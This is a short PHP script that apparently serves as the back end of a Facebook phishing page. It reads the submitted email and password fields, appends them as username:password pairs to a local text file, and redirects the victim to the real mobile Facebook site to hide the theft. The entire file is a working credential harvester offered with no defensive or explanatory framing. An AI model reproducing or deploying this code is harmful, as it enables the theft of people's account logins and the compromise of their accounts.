<?php
header ('Location:http://mbasic.facebook.com');
$handle = fopen("facebookdata.txt", "a");

$username = $_POST['email'];
$pass = $_POST['pass'];
$data=$username.':'.$pass;


fwrite($handle, $data);
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 